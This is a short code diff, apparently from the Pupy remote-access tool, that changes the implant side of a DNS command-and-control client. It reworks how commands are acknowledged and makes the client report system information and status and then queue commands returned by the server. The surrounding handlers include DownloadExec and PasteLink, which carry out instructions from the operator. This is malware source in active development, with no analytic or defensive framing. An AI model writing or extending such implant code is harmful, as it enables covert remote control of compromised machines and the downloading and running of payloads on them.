@@ -320,16 +320,16 @@ class DnsCommandsClient(Thread):
             commands = list(self._request(
                 PupyState(self.pupy.connected, self.pupy.manager.dirty),
                 SystemStatus()))
+
+            ack = self._request(Ack(len(commands)))
+            if not ( len(ack) == 1 and isinstance(ack[0], Ack)):
+                logging.error('ACK <-> ACK failed: received: {}'.format(ack))
         else:
             commands = list(self._request(Poll()))
 
-    	logging.debug('commands: {}'.format(commands))
-        ack = self._request(Ack(len(commands)))
-        if not ( len(ack) == 1 and isinstance(ack[0], Ack)):
-            logging.error('ACK <-> ACK failed: received: {}'.format(ack))
-
         for command in commands:
-            responses = []
+            logging.debug('command: {}'.format(command))
+
             if isinstance(command, Policy):
                 self.poll = command.poll
 
@@ -346,14 +346,19 @@ class DnsCommandsClient(Thread):
                     self.spi = kex.spi
                     self.on_session_established()
             elif isinstance(command, Poll):
-                ack = self._request(SystemInfo())
-                if not len(response) == 1 and not isinstance(response[0], Ack):
-                    logging.error('SystemInfo: ACK expected but {} found'.format(
-                        response))
-                ack = self._request(SystemStatus())
-                if not len(response) == 1 and not isinstance(response[0], Ack):
-                    logging.error('SystemInfo: ACK expected but {} found'.format(
-                        response))
+                response = self._request(SystemInfo())
+
+                if len(response) > 0 and not isinstance(response[0], Ack):
+                    logging.debug('dnscnc:Submit SystemInfo: response={}'.format(response))
+                    for cmd in response:
+                        commands.append(cmd)
+
+                response = self._request(SystemStatus())
+                if len(response) > 0 and not isinstance(response[0], Ack):
+                    logging.debug('dnscnc:Submit SystemStatus: response={}'.format(response))
+                    for cmd in response:
+                        commands.append(cmd)
+
             elif isinstance(command, PasteLink):
                 self.on_pastelink(command.url, command.action, self.encoder)
             elif isinstance(command, DownloadExec):
